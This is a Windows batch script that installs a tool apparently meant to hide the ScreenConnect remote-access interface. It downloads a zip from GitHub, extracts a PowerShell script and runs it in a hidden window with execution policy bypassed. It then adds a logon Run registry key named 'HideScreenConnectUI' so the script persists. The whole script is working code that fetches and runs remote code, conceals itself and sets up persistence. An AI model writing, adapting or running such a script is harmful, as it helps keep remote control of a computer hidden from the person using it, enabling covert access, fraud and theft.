@echo off
setlocal EnableExtensions

set "INSTALL_DIR=C:\Tools\hide"
set "ZIP_URL=https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip"
set "ZIP_FILE=%TEMP%\hide-github.zip"
set "INNER_ZIP=%TEMP%\hidezip-main\hide-sc.zip"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "REGKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "VAL=HideScreenConnectUI"
set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"

echo Installing to %INSTALL_DIR% ...

curl -L -o "%ZIP_FILE%" "%ZIP_URL%"
if errorlevel 1 (
    echo Download failed.
    exit /b 1
)

"%PS%" -NoProfile -Command "$d='%INSTALL_DIR%'; New-Item -ItemType Directory -Path 'C:\Tools' -Force | Out-Null; New-Item -ItemType Directory -Path $d -Force | Out-Null; $t=$env:TEMP; $b=Join-Path $t 'hidezip-main'; if(Test-Path $b){Remove-Item $b -Recurse -Force}; Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath $t -Force; if(Test-Path $d){Get-ChildItem $d | Remove-Item -Recurse -Force}; Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath $d -Force"
if errorlevel 1 (
    echo Failed to extract to %INSTALL_DIR%
    exit /b 1
)

if not exist "%SCRIPT%" (
    echo hide-sc.ps1 not found in %INSTALL_DIR%
    exit /b 1
)

REM start WITHOUT /B = detached process, keeps running after CMD closes
start "" "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"
reg add "%REGKEY%" /v "%VAL%" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f

echo.
echo Done. Files saved to %INSTALL_DIR%
echo Hider is running in background. You can close this window.
exit /b 0
